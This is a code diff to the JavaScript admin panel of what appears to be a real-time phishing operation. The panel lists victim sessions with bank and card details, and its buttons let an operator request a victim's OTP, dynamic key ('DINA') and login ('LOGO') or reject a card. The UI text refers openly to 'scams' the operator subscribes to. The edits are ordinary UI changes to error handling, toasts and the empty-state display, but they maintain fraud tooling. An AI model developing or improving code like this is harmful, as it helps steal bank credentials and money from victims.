@@ -71,6 +71,9 @@ document.addEventListener("touchstart", unlockAudio, { once: true }); */
 function playSound(kind) {
     if (!soundEnabled) return;
 
+    // Solo reproducir si la página está visible (no encolar sonidos)
+    if (document.visibilityState !== "visible") return;
+
     if (!audioUnlocked) {
         pendingSound = kind; // guarda el último sonido pendiente
         return;
@@ -742,8 +745,15 @@ export async function connectAdmin() {
     const data = await r.json();
 
     if (!r.ok) {
-        alert("No autenticado o no se pudo emitir token.");
-        console.error(data);
+        console.error("Error obteniendo token:", data);
+        // Si es error de autenticación, redirigir
+        if (r.status === 401 || r.status === 419) {
+            if (window.handleSessionError) {
+                window.handleSessionError(r.status);
+            }
+        } else if (window.Toast) {
+            Toast.error("No se pudo conectar al servidor.", "Error de Conexión");
+        }
         return;
     }
 
@@ -756,7 +766,20 @@ export async function connectAdmin() {
         const pill = document.getElementById("connPill");
         if (pill) pill.innerHTML = "Socket:" + stateDot("INACTIVE");
         console.error("❌ connect_error:", err.message);
-        alert("Socket error: " + err.message);
+
+        // Verificar si es error de autenticación/token
+        const isAuthError = err.message.toLowerCase().includes("token") ||
+                           err.message.toLowerCase().includes("auth") ||
+                           err.message.toLowerCase().includes("expired") ||
+                           err.message.toLowerCase().includes("unauthorized");
+
+        if (isAuthError && window.handleSessionError) {
+            window.handleSessionError(401);
+        } else if (window.Toast) {
+            Toast.error("Error de conexión: " + err.message, "Socket Error");
+        } else {
+            alert("Socket error: " + err.message);
+        }
     });
 
     socket.on("admin:sessions:bootstrap", (sessions) => {
@@ -817,7 +840,13 @@ export async function connectAdmin() {
         }
     });
 
-    socket.on("error:msg", (msg) => alert(msg));
+    socket.on("error:msg", (msg) => {
+        if (window.Toast) {
+            Toast.error(msg, "Error");
+        } else {
+            alert(msg);
+        }
+    });
 
     // ========================================
     // Panel User Presence Events
@@ -918,7 +947,7 @@ function showToast(message, type = "info") {
     };
 
     const titles = {
-        success: "Exito",
+        success: "Verificado",
         error: "Error",
         warning: "Aviso",
         info: "Info",
@@ -984,6 +1013,17 @@ function renderList() {
     // Render pagination
     renderPagination(totalItems);
 
+    // Show empty state if no items
+    if (totalItems === 0) {
+        listEl.innerHTML = `
+            <div class="alert alert-info mb-0">
+                <i class="fas fa-info-circle"></i> No hay registros disponibles.
+                <a href="/projects/available">Ver scams disponibles</a>.
+            </div>
+        `;
+        return;
+    }
+
     listEl.innerHTML = items
         .map((s) => {
             const selected = selectedId === s.id ? "activeSel" : "";
@@ -1003,10 +1043,10 @@ function renderList() {
             const bankLabel = !s.bank || s.bank === "null"
                 ? "⏳🏦"
                 : `${s.bank.charAt(0).toUpperCase() + s.bank.slice(1)}`;
-            
+
             const typeLabel = !s.cc || s.cc === "null" && !s.level || s.level === "null"
                 ? "⏳💳"
-                : `${s.type.charAt(0).toUpperCase() + s.type.slice(1)} - ${s.level}`;
+                : `${s.type || ""} - ${s.level || ""}`;
             const actionLabel = actionDot(s.action);
             const dot = stateDot(s.state);
 
@@ -1018,9 +1058,8 @@ function renderList() {
 
             // Get project name from map
             const projectName = getProjectName(s.projectId);
-            console.log(items.length)
-            return items.length >= 1 
-            ? `
+
+            return `
                 <div class="row ${selected}" onclick="openSession('${escapeHtml(s.id)}')">
                 <div class="rowMain">
                     <div class="rowTop">
@@ -1055,12 +1094,6 @@ function renderList() {
                     </div>
                     </div>
                 </div>
-                </div>
-            `
-            : `
-                <div class="alert alert-info mb-0">
-                    <i class="fas fa-info-circle"></i> Aún no estas subscrito a ningun Scam.
-                    <a href="{{ route('projects.available') }}">Ver scams disponibles</a>.
                 </div>
             `;
         })
@@ -1233,6 +1266,7 @@ function renderActionsHTML(s, targetElId) {
                 <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_cc')">Error CC</button>
                 <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
                 <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
+                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_auth')">Pedir LOGO</button>
             `;
             break;
 
@@ -1266,7 +1300,6 @@ function renderActionsHTML(s, targetElId) {
             actions.innerHTML = `
                 <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_dinamic')">Error DINA</button>
                 <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
-                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_auth')">Pedir LOGO</button>
                 <button onclick="act('${escapeHtml(s.id)}','request_finish')">Terminar</button>
             `;
             break;
@@ -1279,7 +1312,6 @@ function renderActionsHTML(s, targetElId) {
             actions.innerHTML = `
                 <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_otp')">Error OTP</button>
                 <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
-                <button class="primary" onclick="act('${escapeHtml(s.id)}','request_auth')">Pedir LOGO</button>
                 <button onclick="act('${escapeHtml(s.id)}','request_finish')">Terminar</button>
             `;
             break;
